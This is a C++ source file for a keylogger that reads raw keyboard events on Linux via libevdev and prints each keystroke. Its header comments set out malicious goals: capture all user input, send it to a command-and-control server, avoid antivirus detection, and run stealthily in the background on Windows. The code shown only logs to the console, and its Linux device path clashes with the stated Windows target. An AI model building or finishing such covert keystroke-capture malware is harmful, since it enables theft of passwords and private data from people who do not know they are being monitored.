#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>
#include <iostream>
#include <libevdev-1.0/libevdev/libevdev.h>
#include <string.h>
#include <unordered_map>

using namespace std;

// General features
// ================================================
// Get all user Input
// Sends it over a secure socket to a C&C server
//
// Specific features
// ================================================
// Be undetectable to AV
// Be a x86 software for max compatibility
// Be stealth
// Run on Windows
// Run on background

int main() {
    const char* device = "/dev/input/event4";
    int fd = open(device, O_RDONLY | O_NONBLOCK);

    struct libevdev* dev;
    int rc = libevdev_new_from_fd(fd, &dev);

    std::unordered_map<int, char> keycodeToAscii = {
        {KEY_A, 'a'}, {KEY_B, 'b'}, {KEY_C, 'c'}, {KEY_D, 'd'},
        {KEY_E, 'e'}, {KEY_F, 'f'}, {KEY_G, 'g'}, {KEY_H, 'h'},
        {KEY_I, 'i'}, {KEY_J, 'j'}, {KEY_K, 'k'}, {KEY_L, 'l'},
        {KEY_M, 'm'}, {KEY_N, 'n'}, {KEY_O, 'o'}, {KEY_P, 'p'},
        {KEY_Q, 'q'}, {KEY_R, 'r'}, {KEY_S, 's'}, {KEY_T, 't'},
        {KEY_U, 'u'}, {KEY_V, 'v'}, {KEY_W, 'w'}, {KEY_X, 'x'},
        {KEY_Y, 'y'}, {KEY_Z, 'z'},
        {KEY_1, '1'}, {KEY_2, '2'}, {KEY_3, '3'}, {KEY_4, '4'},
        {KEY_5, '5'}, {KEY_6, '6'}, {KEY_7, '7'}, {KEY_8, '8'},
        {KEY_9, '9'}, {KEY_0, '0'},
        {KEY_SPACE, ' '}, {KEY_ENTER, '\n'}, {KEY_TAB, '\t'},
        {KEY_COMMA, ','}, {KEY_DOT, '.'}, {KEY_SLASH, '/'},
        {KEY_SEMICOLON, ';'}, {KEY_APOSTROPHE, '\''}, {KEY_LEFTBRACE, '['},
        {KEY_RIGHTBRACE, ']'}, {KEY_MINUS, '-'}, {KEY_EQUAL, '='},
        {KEY_BACKSLASH, '\\'}, {KEY_GRAVE, '`'}
    };

    bool shiftPressed = false;

    while (true) {
        struct input_event ev;
        rc = libevdev_next_event(dev, LIBEVDEV_READ_FLAG_NORMAL, &ev);
        if (rc == 0) {
            if (ev.type == EV_KEY) {
                if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
                    shiftPressed = (ev.value == 1);
                } else if (ev.value == 1) {
                    auto it = keycodeToAscii.find(ev.code);
                    if (it != keycodeToAscii.end()) {
                        char asciiChar = it->second;
                        if (shiftPressed) {
                            if (asciiChar >= 'a' && asciiChar <= 'z') {
                                asciiChar = toupper(asciiChar);
                            }
                        }
                        cout << asciiChar << endl;
                    } else {
                        cout << ev.code << endl;
                    }
                }
            }
        }
        usleep(1000);
    }

    libevdev_free(dev);
    close(fd);

    return 0;
}
